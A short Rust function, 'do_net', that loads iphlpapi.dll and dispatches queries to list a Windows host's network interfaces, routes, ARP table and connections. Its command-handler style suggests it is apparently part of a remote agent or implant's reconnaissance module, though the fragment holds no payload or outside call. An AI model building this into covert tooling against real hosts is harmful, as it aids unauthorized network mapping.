pub fn do_net(query: &str) -> Response {
    if !force_load(b"iphlpapi.dll") {
        return Response::Err("net: iphlpapi.dll load failed".into());
    }
    match query {
        "interfaces" | "ifconfig" | "" => net_interfaces(),
        "routes" | "route" | "netstat" => net_routes(),
        "arp" => net_arp(),
        "connections" | "conn" => net_connections(),
        other => Response::Err({
            let mut e = String::new();
            e.push_str("net ");
            e.push_str(other);
            e.push_str(": unknown query type");
            e
        }),
    }
}
